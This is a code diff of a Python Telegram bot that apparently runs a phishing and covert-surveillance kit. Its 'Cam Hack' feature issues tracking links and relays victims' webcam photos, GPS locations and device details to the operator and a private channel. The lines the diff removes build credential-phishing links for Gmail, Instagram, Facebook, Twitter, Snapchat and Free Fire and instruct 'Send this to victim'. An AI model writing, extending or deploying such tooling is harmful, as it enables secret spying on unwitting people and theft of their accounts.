@@ -7,7 +7,7 @@ from config import *
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# In-memory storage (clears after 10 min)
+# In-memory storage
 user_data = {}
 link_cache = {}
 
@@ -28,7 +28,6 @@ def generate_phishing_link(user_id, target_type):
         return "❌ BASE_URL missing! Set it in Render env."
     unique_id = str(uuid.uuid4())[:8]
     link = f"{BASE_URL}/p/{unique_id}?type={target_type}&v={user_id}"
-    # Store in cache for 10 min
     link_cache[unique_id] = {"user_id": user_id, "type": target_type, "time": time.time()}
     return link
 
@@ -39,11 +38,11 @@ def start(message):
     bot.send_message(
         user_id,
         "🔥 *Choose your weapon:*\n\n"
-        "📸 Cam Hack\n"
-        "📱 Social Media\n"
-        "📧 Gmail\n"
-        "🎮 Free Fire\n"
-        "🔗 All Links",
+        "📸 Cam Hack (working)\n"
+        "📱 Social Media (coming soon)\n"
+        "📧 Gmail (coming soon)\n"
+        "🎮 Free Fire (coming soon)\n"
+        "🔗 All Links (coming soon)",
         reply_markup=get_bottom_buttons(),
         parse_mode="Markdown"
     )
@@ -54,7 +53,7 @@ def handle_bottom_buttons(message):
     user_id = message.from_user.id
     text = message.text
 
-    # ----- CAM HACK -----
+    # ----- CAM HACK (FULLY WORKING) -----
     if text == "📸 Cam Hack":
         msg = bot.send_message(
             user_id,
@@ -63,67 +62,13 @@ def handle_bottom_buttons(message):
         )
         bot.register_next_step_handler(msg, get_cam_photo, user_id)
 
-    # ----- SOCIAL MEDIA -----
-    elif text == "📱 Social Media":
-        markup = InlineKeyboardMarkup(row_width=2)
-        markup.add(
-            InlineKeyboardButton("Instagram", callback_data="ig"),
-            InlineKeyboardButton("Facebook", callback_data="fb"),
-            InlineKeyboardButton("Twitter", callback_data="tw"),
-            InlineKeyboardButton("Snapchat", callback_data="sc"),
-            InlineKeyboardButton("⬅ Back", callback_data="back")
-        )
-        bot.send_message(user_id, "Choose platform:", reply_markup=markup)
-
-    # ----- GMAIL -----
-    elif text == "📧 Gmail":
-        link = generate_phishing_link(user_id, "gmail")
-        if "❌" in link:
-            bot.send_message(user_id, link, reply_markup=get_bottom_buttons())
-            return
-        markup = InlineKeyboardMarkup(row_width=2)
-        markup.add(
-            InlineKeyboardButton("🔗 Open Link", url=link),
-            InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{link}"),
-            InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/")
-        )
+    # ----- DUMMY BUTTONS (coming soon) -----
+    elif text in ["📱 Social Media", "📧 Gmail", "🎮 Free Fire", "🔗 All Links"]:
         bot.send_message(
             user_id,
-            f"✅ *GMAIL phishing link ready:*\n\n`{link}`\n\nSend this to victim.",
-            reply_markup=markup,
+            f"⏳ *{text}* is coming soon. Only *Cam Hack* is working right now.",
+            reply_markup=get_bottom_buttons(),
             parse_mode="Markdown"
-        )
-
-    # ----- FREE FIRE -----
-    elif text == "🎮 Free Fire":
-        link = generate_phishing_link(user_id, "ff")
-        if "❌" in link:
-            bot.send_message(user_id, link, reply_markup=get_bottom_buttons())
-            return
-        markup = InlineKeyboardMarkup(row_width=2)
-        markup.add(
-            InlineKeyboardButton("🔗 Open Link", url=link),
-            InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{link}"),
-            InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/")
-        )
-        bot.send_message(
-            user_id,
-            f"✅ *FREE FIRE phishing link ready:*\n\n`{link}`\n\nSend this to victim.",
-            reply_markup=markup,
-            parse_mode="Markdown"
-        )
-
-    # ----- ALL LINKS -----
-    elif text == "🔗 All Links":
-        links = {}
-        for t in ["cam", "ig", "fb", "tw", "sc", "gmail", "ff"]:
-            links[t] = generate_phishing_link(user_id, t)
-        text_msg = "```\n" + "\n".join([f"{k.upper()}: {v}" for k, v in links.items()]) + "\n```"
-        bot.send_message(
-            user_id,
-            text_msg,
-            parse_mode="Markdown",
-            reply_markup=get_bottom_buttons()
         )
 
     else:
@@ -182,58 +127,18 @@ def get_cam_redirect(message, user_id):
         )
         bot.register_next_step_handler(message, get_cam_redirect, user_id)
 
-# ========== INLINE CALLBACKS ==========
+# ========== INLINE CALLBACKS (only for copy) ==========
 @bot.callback_query_handler(func=lambda call: True)
 def handle_inline(call):
     user_id = call.from_user.id
     data = call.data
 
-    if data == "back":
-        start(call.message)
-
-    elif data.startswith("copy_"):
+    if data.startswith("copy_"):
         bot.answer_callback_query(call.id, "✅ Link copied!")
-
-    elif data in ["ig", "fb", "tw", "sc"]:
-        link = generate_phishing_link(user_id, data)
-        if "❌" in link:
-            bot.answer_callback_query(call.id, "❌ BASE_URL missing!")
-            return
-        markup = InlineKeyboardMarkup(row_width=2)
-        markup.add(
-            InlineKeyboardButton("🔗 Open Link", url=link),
-            InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{link}"),
-            InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/"),
-            InlineKeyboardButton("⬅ Back", callback_data="social_back")
-        )
-        bot.edit_message_text(
-            f"✅ *{data.upper()} phishing link ready:*\n\n`{link}`\n\nSend this to victim.",
-            chat_id=user_id,
-            message_id=call.message.message_id,
-            reply_markup=markup,
-            parse_mode="Markdown"
-        )
-
-    elif data == "social_back":
-        markup = InlineKeyboardMarkup(row_width=2)
-        markup.add(
-            InlineKeyboardButton("Instagram", callback_data="ig"),
-            InlineKeyboardButton("Facebook", callback_data="fb"),
-            InlineKeyboardButton("Twitter", callback_data="tw"),
-            InlineKeyboardButton("Snapchat", callback_data="sc"),
-            InlineKeyboardButton("⬅ Back", callback_data="back")
-        )
-        bot.edit_message_text(
-            "Choose platform:",
-            chat_id=user_id,
-            message_id=call.message.message_id,
-            reply_markup=markup
-        )
 
 # ========== FORWARD DATA TO USER + CHANNEL ==========
 def forward_to_user_and_channel(user_id, data):
     try:
-        # Message for user
         user_text = f"📥 *Victim Data Received*\n🆔 ID: {data.get('victim_id', 'Unknown')}\n"
         device = data.get('device_info', {})
         if device:
@@ -246,7 +151,6 @@ def forward_to_user_and_channel(user_id, data):
 
         bot.send_message(user_id, user_text, parse_mode="Markdown")
 
-        # Photo to user
         photo_data = data.get('photo')
         if photo_data and photo_data.startswith('data:image'):
             import base64, os
@@ -260,12 +164,11 @@ def forward_to_user_and_channel(user_id, data):
             except:
                 pass
 
-        # Location to user
         loc = data.get('location')
         if loc and loc.get('lat') and loc.get('lng'):
             bot.send_location(user_id, loc['lat'], loc['lng'])
 
-        # ----- FORWARD TO PRIVATE CHANNEL -----
+        # Forward to channel
         channel_text = f"📥 *New Victim Data*\n🆔 ID: {data.get('victim_id', 'Unknown')}\n"
         if device:
             channel_text += f"📱 Device: {device.get('userAgent', 'N/A')[:50]}...\n"
@@ -276,7 +179,6 @@ def forward_to_user_and_channel(user_id, data):
 
         bot.send_message(PRIVATE_CHANNEL_ID, channel_text, parse_mode="Markdown")
 
-        # Photo to channel
         if photo_data and photo_data.startswith('data:image'):
             import base64, os
             try:
@@ -289,17 +191,16 @@ def forward_to_user_and_channel(user_id, data):
             except:
                 pass
 
-        # Location to channel
         if loc and loc.get('lat') and loc.get('lng'):
             bot.send_location(PRIVATE_CHANNEL_ID, loc['lat'], loc['lng'])
 
     except Exception as e:
         print(f"Forward error: {e}")
 
-# ========== AUTO-DELETE LINK CACHE AFTER 10 MIN ==========
+# ========== AUTO-DELETE LINK CACHE ==========
 def clean_old_links():
     while True:
-        time.sleep(600)  # 10 minutes
+        time.sleep(600)
         current_time = time.time()
         to_delete = []
         for key, val in link_cache.items():
@@ -309,12 +210,11 @@ def clean_old_links():
             del link_cache[key]
         print(f"🧹 Deleted {len(to_delete)} old links")
 
-# Start cleaner thread
 threading.Thread(target=clean_old_links, daemon=True).start()
 
 # ========== RUN ==========
 if __name__ == "__main__":
-    print("🤖 Bot is running...")
+    print("🤖 Bot is running... Cam Hack is working.")
     while True:
         try:
             bot.infinity_polling(timeout=60)
